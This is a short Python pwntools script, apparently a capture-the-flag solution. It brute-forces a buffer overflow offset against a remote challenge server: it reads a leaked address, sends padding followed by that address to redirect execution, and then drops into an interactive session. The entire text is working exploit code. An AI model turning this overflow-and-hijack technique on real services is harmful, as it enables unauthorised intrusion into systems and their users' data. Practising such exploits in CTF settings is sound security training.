from pwn import *


for offset in range(0, 200):
    print("Trying: ", offset)
    p = remote("0.cloud.chals.io", 30096)
    msg = p.recvuntil(b"> \n")
    addr = int(msg.split()[-9], 16)
    payload = b'a'*offset + p64(addr)
    p.sendline(payload)
    p.interactive()

